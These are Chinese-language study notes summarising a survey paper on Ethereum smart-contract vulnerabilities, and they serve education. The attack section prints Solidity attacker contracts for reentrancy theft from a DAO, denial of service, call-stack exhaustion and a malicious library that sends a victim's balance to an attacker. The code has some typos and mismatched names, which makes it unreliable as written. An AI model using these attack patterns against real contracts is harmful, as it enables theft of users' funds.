# Outline

## A Survey of Attacks on Ethereum Smart Contracts (SoK) - POST 2017

Created by : Mr Dk.

2020 / 02 / 14 19:03 🌹

Ningbo, Zhejiang, China

---

## Abstract

Smart contracts 是无需外部可信的第三方机构，就能在互不信任的网络结点上执行的计算机程序。能被正确执行的前提是，其实现需要足够安全。

本文研究了 __以太坊 (Ethereum)__ 智能合约中的安全问题，对一些普遍的编程漏洞进行了分类，并对每类漏洞提出了相应的攻击方法。

---

## 1. Introduction

区块链是一个 append-only 的数据结构。数字货币使用区块链作为公共账本，记录所有的货币转账。智能合约是互不信任的结点通过区块链的共识机制一致认同的货币机制。

在以太坊中，智能合约被渲染为 [_图灵完全语言_]([https://zh.wikipedia.org/zh-cn/%E5%9C%96%E9%9D%88%E5%AE%8C%E5%82%99%E6%80%A7](https://zh.wikipedia.org/zh-cn/圖靈完備性)) 编写的计算机程序。以太坊的共识机制确保合约的正确执行。为了向区块链上追加新的 block，结点需要进行一种碰运气的计算，成功概率与结点的计算能力成比例。

单纯保证合约执行的正确性不足以使智能合约安全。在以太坊中，智能合约的实现也有可能产生漏洞。其中，大部分漏洞来源于以太坊支持的高级语言 [_Solidity_](https://en.wikipedia.org/wiki/Solidity) 和程序员直观上的偏差。

另外，已知的以太坊安全问题来源过于广泛 - 官方文档、学术论文、网络讨论等。暂时缺乏系统性的、完整的研究。

本文的贡献：

* 第一个系统地阐述了以太坊及其编程语言 Solidity 的安全漏洞

---

## 2. Background on Ethereum Smart Contracts

以太坊是一个去中心化的虚拟机，用于执行用户请求的合约。合约由图灵完全的 EVM 字节码编写。合约的一个特性是，可以在合约之间收 / 发 _ether_ (数字货币)。用户可以向以太坊中发送 transactions (相当于交易)：

1. 创建新的合约
2. 调用合约中的函数
3. 向合约或其它用户转账 ether

所有的 transaction 被记录在区块链上。区块链上的 transaction 序列决定了每个合约的状态，以及每个用户的余额。

每个合约被网络中互不信任的 _矿工_ 处理。矿工使用 _PoW_ 的共识机制将 transactions 记录到区块链上，并抽取每个 transaction 中的手续费。

### 2.1 Programming Smart Contracts

对于合约的编程，一般不会直接使用 EVM 字节码，而是使用类 JavaScript 的编程语言 Solidity。直观地说，合约能够接收并保存其它用户支付的 _ether_，也能通过函数将 _ether_ 发送给其它用户。

合约由 fields 和 functions 组成。用户可以通过向以太坊结点发送合适的 transaction，来调用合约中的函数，在 transaction 中需要包含支付给矿工的手续费，可能还包含了调用者支付给合约的 _ether_ 。当合约中的程序执行异常时，手续费丢失，其它副作用 (包括 _ether_ 转账) 将会被复原。

### 2.2 Execution Fees

在理想情况下，每次函数调用会被以太坊网络中的所有矿工执行。矿工能够得到函数调用者支付的执行费。除了作为报酬，执行费可用于防止 DoS 攻击 - 攻击者可能通过耗时的计算来拖慢网络。

执行费被定义为 _gas_ ，可被理解为燃料，是用户支付的用于执行代码的开销。用户支付的费用越高，矿工有越高的几率执行这样的 transaction (矿工可以自由选择将哪些 transactions 上链，通常来说优先选择报酬更高的)。每个 EVM 操作都会消耗特定数量的 gas，总体消耗量取决于矿工执行操作的完整序列。

矿工会正常执行 transaction，直到正常终止，除非抛出异常

* 如果 transaction 正常结束，剩下的 gas 会返回给调用者
* 否则所有分配给 transaction 的 gas 都被丢失
* 如果计算消耗了分配的所有 gas，将会以 _out-of-gas_ 异常结束，调用者丢失所有的 gas

因此，如果攻击者想要通过调用一些很耗时的操作来进行 DoS，必须分配很多的 gas。

### 2.3 The Mining Process

矿工将用户提交的 transactions 划分为 block，并试图将 block 追加到区块链上，以获得相应的奖励。将 block 追加到链上的过程就是挖矿的过程，实际上是一个 PoW 的过程 - 基于前一个 block 和当前 block 中所有 transaction 的计算过程。这个计算过程的难度可以动态调节。

当一个矿工解出了计算结果，就可以广播这个合法的 block，其它矿工会停止当前的挖矿，转而计算下一个 block。

### 2.4 Compiling Solidity into EVM Bytecode

虽然合约被表示为 Solidity 中的函数集合，EVM 字节码本身不支持函数。因此，Solidity 的编译器实现扮演函数分发的工作 - 每个函数由一个基于函数名和类型参数的签名唯一标识。函数调用时，签名被作为输入传递给被调用的合约 - 如果签名匹配，就跳入相应的代码；否则就跳入 _fallback_ 函数。这是一个没有名字、没有参数、可被随意编程的函数。这个函数也会在想合约传递一个空签名时被触发 (向合约发送 _ether_ 时)。

---

## 3. A Taxonomy of Vulnerabilities in Smart Contracts

根据威胁发生的层次来分类：

* Solidity 层
  * Call to the unknown
  * Gasless send
  * Exception disorders
  * Type casts
  * Reentrancy
  * Keeping secrets
* EVM 层
  * Immutable bugs
  * Ether lost in transfer
  * Stack size limit
* Blockchain 层
  * Unpredictable state
  * Generating randomness
  * Time constraints

### 3.1 Call to the Unknown

Solidity 中一些用于调用函数或转账 _ether_ 的原语会有调用 fallback 函数的副作用。

* `send` 用于从正在运行的合约中转账 _ether_ 给接收者 `r` - `r.send(amount)`

  * 在转账完毕后，`send()` 会执行接收者的 fallback 函数

* `delegatecall` 与 `send` 类似，但区别在于，被调用的函数是在调用者的环境中运行

  * `c.delegatecall(bytes(sha3("ping(uint256)")), n)` 中，如果 `ping()` 中含有 `this` 引用，该引用指代调用者的地址，而不是 `c` 的地址
  * 如果 `ping()` 变为 `d.send(amount)`，则是从调用者自身的余额中向 `d` 转账

* 直接调用 (direct call)

  ```solidity
  contract Alice {
    function ping(uint) returns (uint);
  }
  
  constract Bob {
    function pong(Alice c) {
      c.ping(42);
    }
  }
  ```

  * 如果程序员搞错了 Alice 中的函数类型，在调用时使用了其它类型的参数，那么计算出的签名与 Alice 中的任何函数都不匹配，从而导致调用了 Alice 的 fallback 函数

### 3.2 Exception Disorder

在 Solidity 中可能产生异常的场景：

1. 执行耗光了 gas
2. 调用栈达到上限
3. 执行到了 `throw` 命令

Solidity 对于异常的处理有两种行为，取决于合约如何相互调用，比如：

```solidity
contract Alice {
  function ping(uint) returns (uint)
}

contract Bob {
  uint x=0;
  function pong(Alice c) { x=1; c.ping(42); x=2; }
}
```

在这个例子中，如果用户调用了 Bob 的 `pong()`，其中在运行到 Alice 的 `ping()` 时抛出异常，那么执行过程停止，整个 transaction 的副作用全部被恢复，此时 `x` 为 `0`；而假设 Bob 是通过 `call()` 来调用 `ping()` 的，那么只有 `call()` 这个调用的副作用会被恢复，并返回 `false`，然后执行继续 - 因此 `x` 在执行结束后为 `2`。

* 如果函数执行链上的每一个元素都是一个 direct call，那么副作用将被全部回滚，在执行过程中消耗的 gas 全部被消费
* 如果函数执行链上至少有一个 `call` (或 `send` / `delegatecall`)，那么副作用将会被回滚到 `call` 的位置为止，`call` 返回 `false`，然后执行恢复；`call` 消耗的所有 gas 都被消费

在调用函数前，可以指定消耗的 gas 上限。如果不指定上限，那么所有的 gas 可能都会被消费。

异常处理的不规则性可能会引发合约执行的安全漏洞 (比如不注意 `call` / `send` 的返回值)

### 3.3 Gasless Send

函数 `send()` 与 `call()` 类似，会被编译为一个空签名的 `call()` 函数，因此被调用方的 fallback 将会被调用。用于执行 fallback 的 gas 固定为 2300 单位，只够执行有限数量的字节码指令。

因此，`send()` 只有在两种情况下才会成功：

1. 接收方是一个合约，且 fallback 的运行代价便宜 (< 2300 gas unit)
2. 接收方是一个用户

### 3.4 Type Casts

Solidity 编译器会检查一部分类型错误。对于以下的合约：

```solidity
contract Alice { function ping(uint) returns (uint); }
contract Bob { function pong(Alice c) { c.ping(42); } }
```

对于 Bob 合约，编译器只会检查 Alice 合约是否声明了函数 `ping()`，不会检查：

1. `c` 是一个 Alice 合约地址
2. Bob 声明的接口与 Alice 的实际接口相匹配

如果发生地址类型不同，在运行时将不会抛出异常。Direct call 与 `call()` 会被编译为相同的 EVM 字节码，但是可能会出现一些不同：

* 如果 `c` 不是一个合约地址，调用会直接返回，不执行任何代码
* 如果 `c` 对应的地址指向任何带有与 Alice 的 `ping()` 具有相同签名的合约，函数都会被执行
* 如果 `c` 对应的合约没有任何函数匹配 Alice 的 `ping()` 的签名，`c` 的 fallback 函数将会被调用

由此，没有任何异常将会被抛出，调用者也不会察觉到错误。

### 3.5 Reentrancy

从程序员的视角看，一个非递归的函数被调用后，在执行结束前是不可能被重入的。但是，由于 fallback 机制的存在，攻击者能够重入被调用的函数，导致递归调用，最终消耗完所有的 gas。

区块链上一个已有的合约：

```solidity
contract Bob {
  bool sent = false;
  function ping(address c) {
    if (!sent) {
      c.call.value(2)();
      sent = true;
    }
  }
}
```

攻击者发布恶意合约：

```solidity
contract Bob { function ping(); }

contract Mallory {
  function() {
    Bob(msg.sender).ping(this);
  }
}
```

Bob 的 `ping()` 以 Mallory 的地址被调用，向 Mallory 支付两个 _ether_ ，由于 `call()` 的签名为空，因此会调用 Mallory 的 fallback 函数，在该函数中，重新调用了 Bob 的 `ping()`，并形成递归调用。

函数只会在以下几种情况下异常停止：

1. gas 用尽
2. 栈限制超出
3. Bob 中的 _ether_ 用尽

由于 `call()` 只会恢复触发异常的最后一次调用的副作用，因此之前的转账都会是合法的。

### 3.6 Keeping Secrets

合约中的 field 可以被声明为 `private` (不可见)，但并不意味着这就安全了。由于区块链是公开的，每个人都可以查看 transaction 中的内容，从而推断出 field 的新值。

因此，为了保证 field 的秘密性，可能需要引入一些密码学的机制。

### 3.7 Immutable Bugs

一旦合约在区块链上发布以后，就不能再被更改了。如果合约中存在 bug，没有直接的方法可以修补漏洞。对策是使用 _hard-fork_ 来形成新的区块链分支，从而将受到攻击的 transaction 的作用的消除。

### 3.8 Ether Lost in Transfer

当转账 _ether_ 时，需要指定接收方的地址。如果接收方的地址不对应于任意一个合约或用户，那么 _ether_ 就会永远丢失，无法恢复。

### 3.9 Stack Size Limit

当一个合约中的函数调用另一个合约中的函数时，调用栈将会增长 1。调用栈的上限被规定为 1024 - 当调用栈达到这个限制后，再一次的调用将会抛出异常。

在 2016 年之后的 hard-fork 中，规定了最多只能分配 63/64 的 gas，根据每个 block 的 gas 限制，调用栈可到达的最大深度总是不会超过 1024。

### 3.10 Unpredictable State

合约的状态由合约中 field 的值和余额决定。当用户发送 transaction 执行某个合约时，无法保证 transaction 被执行时的状态与发送时一致 - 与此同时，可能其它 transaction 会改变合约的状态。

另外，矿工处理 transaction 的顺序也不是固定的，他们可以决定不处理某些 transactions。

### 3.11 Generating Randomness

EVM 字节码的执行是确定的，所有矿工执行字节码后都会产生同样的结果。为了仿真某些不确定性的选择，很多合约会产生伪随机数，种子由各个矿工独自选择。

一种通常的选择方法：使用未来某个 block 的 hash 或 timestamp 作为种子 - 因为对于所有矿工来说，对于区块链的视角都是相同的，运行时结果对大家都是一样的。另外这样也是安全的，因为未来 block 是无法预测的。

然而，由于矿工可以控制将哪些 transaction 放入 block 中，一些恶意矿工可以精心制造一个 block，从而绕过随机生成。

一种解决方法使用定时的承诺协议。在协议中，每一方都选择一个秘密，并付一定的定金作为保证。接下来，参与者要么公布各自的秘密，要么丢失自己付的定金。伪随机数由所有参与者的秘密组合起来共同产生。攻击者可以选择不公布他的秘密，从而绕过伪随机数，但攻击者不得不损失其定金。

> 其它参与者公布了各自的秘密，而攻击者不公布其秘密。因此，攻击者能够知道伪随机数，而其它参与者由于不知道攻击者的那一份秘密而无从得知。

### 3.12 Time Constraints

在很多应用中，都会使用到时间约束。通常来说，时间约束使用 block timestamp 实现。由于在一定程度上可以自由选择其新挖出的 block 上的 timestamp，因此可能会选择一个特定的值。

---

## Attacks

### 4.1 The DAO Attack

DAO 是一个实现了众筹功能的合约。在 2016 年 6 月 18 日被攻击之前，筹集了 $150M。攻击者试图将 $60M 划入其控制之下。直到最后对区块链进行 hard-fork 之后才消除了攻击带来的影响。

首先是 DAO 本身。它允许参与者向合约捐赠，也允许撤销捐赠。

```solidity
contract SimpleDAO {
  mapping (address => uint) public credit;
  
  function donate(address to) {
    credit[to] += msg.value;
  }
  
  function withdraw(uint amount) {
    msg.sender.call.value(amount)();
    credit[msg.sender] -= amount;
  }
}
```

攻击 1：

```solidity
contract Mallory {
  SimpleDAO public dao = SimpleDAO(0x354...);
  address owner;
  
  function Mallory() {
    owner = msg.sender;
  }
  
  function() {
    dao.withdraw(dao.queryCredit(this));
  }
  
  function getJackpot() {
    owner.send(this.balance);
  }
}
```

攻击者发布了如上的恶意合约。首先攻击者向 DAO 捐赠了一些 _ether_ 。攻击从调用 Mallory 的 fallback 开始 - 其中调用了 DAO 的 `withdraw()` - 在 `withdraw()` 中，由于调用了 `call()`，因此又再度触发了 Mallory 的 fallback - 从而实现了反复给 Mallory 转账，而 DAO 那边没有记账。

1. 用尽 gas
2. 调用栈溢出
3. DAO 的余额用尽

只有上述情况发生后，这个过程才会停止。此时，攻击者已经窃取了 DAO 中所有的 _ether_ 。攻击者可以提供较多的 gas，防止 out-of-gas 提前发生。

攻击 2：

```solidity
contract Mallory2 {
  SimpleDAO public dao = SimpleDAO(0x42..);
  address owner;
  bool performAttack = true;
  
  function Mallory2() {
    owner = msg.sender;
  }
  
  function attack() {
    dao.donate.value(1)(this);
    dao.withdraw(1);
  }
  
  function() {
    if (performAttack) {
      performAttack = false;
      dao.withdraw(1);
    }
  }
  
  function getJackpot() {
    dao.withdraw(dao.balance);
    owner.send(this.balance);
  }
}
```

攻击者发布如上的恶意合约，并在其中放一部分的 _ether_ 。然后，攻击者调用 `attack()`，将合约中的 _ether_ 捐赠到 DAO，并随后撤销捐赠。DAO 的撤销函数验证了恶意合约有捐赠余额，因此会向恶意合约转账。与上一个攻击类似，转账的过程触发了恶意合约的 fallback，在其中又一次调用了撤销捐赠 - 那么 DAO 又一次向恶意合约转账，并再次触发 fallback。此次，不会进入 `if` 体内了，嵌套的函数调用开始关闭，从而使 DAO 中恶意合约的记账被连续执行两次，从而引发 underflow，变成了 `2^256 - 1`。此时，攻击者只需要再调用 `getJackpot()` 就可以把 DAO 中的 _ether_ 全部拿光。

这两个攻击可行都是因为 DAO 是在汇款后才更新记账的。攻击者利用了可重入威胁实行了攻击。

### 4.2 King of the Ether Throne

该合约是一个游戏。如果一个参与者想成为国王，就需要向现在的国王付一定的 _ether_ ，加上给合约付一定的手续费。

```solidity
contract KotET {
  address public king;
  uint public clainPrice = 100;
  address owner;
  
  function kotET() {
    owner = msg.sender;
    king = msg.sender;
  }
  
  function sweepCommission(uint n) {
    owner.send(n);
  }
  
  function() {
    if (msg.value < clainPrice) throw;
    
    uint compensation = calculateCompensation();
    king.send(compensation);
    king = msg.sender;
    clainPrice = calculateNewPrice();
  }
}
```

当玩家向合约发送 _ether_ 后，触发 fallback 函数。在函数中，首先检查给的钱够不够，如果不够，就抛出异常，转账复原；如果给的钱够了，玩家就会成为新的国王。

玩家付的手续费保存在合约中，合约所有者可以将合约中的钱提走。

实际上，该合约的 fallback 函数中，没有检查 `send()` 的返回值 - 如果 king 的 fallback 要消耗大量的 gas，就会导致异常，被退位的 king 没有收到转账，却被别人挤走了。

如果这个函数被实现地安全一些，就不会出现这样的问题：

```solidity
contract KotET {
  ...
  
  function() {
    if (msg.value < clainPrice) throw;
    
    uint compensation = calculateCompensation();
    if (!king.call.value(compensation)()) throw;
    king = msg.sender;
    clainPrice = calculateNewPrice();
  }
}
```

但可能导致 DoS 攻击。攻击者可以发布如下的恶意合约：

```solidity
contract Mallory {
  function unseatKing(address a, uint w) {
    a.call.value(w);
  }
  
  function() {
    throw;
  }
}
```

攻击者调用 `unseatKing()` 来使现在的国王退位，自己成为国王。之后，任何其他人想要成为国王时，由于在向现任国王 (恶意合约) 退钱时，触发恶意合约的 fallback 抛出异常，因此退位永远不会成功。

### 4.3 Rubixi

利用 immutable bugs 的威胁，攻击者可以从其它合约上窃取 _ether_ 。

在合约开发过程中，合约的名字被修改后，程序员忘记修改构造函数的名字，从而原来的构造函数成为了一个可以被任何人调用的函数。

> ？

### 4.4 Multi-player Games

合约是一个游戏，每次两人参加。每个人各选一个数，如果两数只和为偶数，则第一个人赢；否则第二个人赢。

```solidity
contract OddAndEvens {
  struct Player {
    address addr;
    uint number;
  }
  Player[2] private players;
  uint8 tot = 0;
  
  address owner;
  
  function OddsAndEvens() {
    owner = msg.sender;
  }
  
  function play(uint number) {
    if (msg.value != 1 ether) throw;
    players[tot] = Player(msg.sender, number);
    tot++;
    if (tot == 2) addTheWinnerIs();
  }
  
  function andTheWinnerIs() private {
    uint n = players[0].number + players[1].number;
    players[n%2].addr.send(1800 finney);
    delete players;
    tot = 0;
  }
  
  function getProfit() {
    owner.send(this.balance);
  }
}
```

在一个 private 的 field 中记录两个玩家。想要加入游戏，就需要在调用 `play()` 时转账 1 _ether_ - 如果转账金额不对，就会抛出异常把金额退还。一旦两个玩家加入游戏，合约就会立刻调用 `andTheWinnerIs()` 进行计算，将 1.8 _ether_ 发送给赢家，剩下的 0.2 _ether_ 会作为余额留在合约中作为利润。

如果攻击者想要每次都赢，只需要称为第二个进入游戏的人即可。虽然 `player` 这个 field 是 private 的，但攻击者可以通过查看区块链中的 transaction 来观察第一个玩家是否加入，和玩家所带的数是多少。从而可以做到每次都赢。

### 4.5 GovernMental

一个庞氏骗局。为了加入，参与者必须向合约发送特定数量的 _ether_ 。如果没有任何人在 12h 内加入，那么最后一个参与者将会获得合约中所有的余额 (除去一部分手续费)。

简化版本的合约如下：

```solidity
contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;
  
  function Governmental() {
    owner = msg.sender;
    if (msg.value < 1 ether) throw;
  }
  
  function invest() {
    if (msg.value < jackpot / 2) throw;
    
    lastInvestor = msg.sender;
    jackpot += msg.value / 2;
    lastInvestmentTimestamp = block.timestamp;
  }
  
  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp + ONE_MINUTE)
      throw;
    
    lastInvestor.send(jackpot);
    owner.send(this.balance - 1 ether);
    
    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}
```

为了参与这个合约，玩具需要投资至少 `jackpot / 2` 数量的 _ether_ - 每次投资后，这个上限都会变高。合约假定玩家都是用户或者空 fallback 的合约 - 因此在 `send()` 时不会产生 out-of-gas 异常。

攻击 1 - 攻击者为合约所有者，其目标是不把 _ether_ 付给赢家。它可以发布如下合约：

```solidity
contract Mallory {
  function attack(address target, uint count) {
    if (0 <= count && count < 1023)
      this.attack.gas(msg.gas - 2000)(target, count + 1);
    else
      Governmetal(target).resetInvestment();
  }
}
```

攻击者反复调用自身，引发调用栈的增长。当调用栈达到 1022 的深度后，调用 GovernMetal 的 `resetInvestment()`，此时调用栈为 1023。向赢家调用 `send()` 时，由于调用栈深度的限制而产生异常，转账失败。但合约中没有对 `send()` 的返回值做判断，因此合约继续执行，游戏开始新的一轮，上轮赢家没有拿到钱。而合约所有者只需要等新一轮游戏正确结束后，就能拿到上一轮所有的钱。

攻击 2 - 攻击者是一个矿工。它只需要保证除了它以外的所有 transaction 都不上链，那么它就一直是游戏的最后一轮参与者了。这个漏洞使用了 unpredictable state 威胁 - transaction 能否上链是不确定的。

攻击 3 - 攻击者也是矿工。矿工可以设置新 block 的 timestamp 为当前 block timestamp 的一分钟以后。

### 4.6 Dynamic Libraries

合约可以动态更新其 field。Library 是一种特殊的合约，其中不能有可被修改的 field，实现了一些别的合约需要用到的基本功能。合约运行时可以将其依赖的 library 动态更新为新版本。对 library 中函数的调用是通过 `delegatecall` 完成的 (运行于调用者一方)。

Bob 是使用 library 合约的合约，使用 `getSetVersion()` 来查询 library 的版本：

```solidity
library Set { function version() returns (uint); }
contract Bob {
  SetProvider public provider;
  function Bob(address arg) {
    provider = SetProvider(addr);
  }
  
  function getSetVersion() returns (uint) {
    address setAddr = provider.getSet();
    return Set(setAddr).version();
  }
}
```

如果 library 提供方也是攻击者：

```solidity
library MaliciousSet {
  address constant attackerAddr = 0x42;
  function version() returns(uint) {
    attackerAddr.send(this.balance);
    return 1;
  }
}
```

Library 的提供方将 library 动态更新为恶意 library，而 Bob 并不知情。Bob 调用 `version()` 后，由于是使用 `delegatecall` 来调用的，运行环境在 Bob 一侧，因此 `this.balance` 指的是 Bob 的余额。Bob 把自己所有的余额发给了攻击者。

这个攻击利用了 unpredictable state 威胁。由于 library 版本的动态性，因此调用的版本不可预知。

---

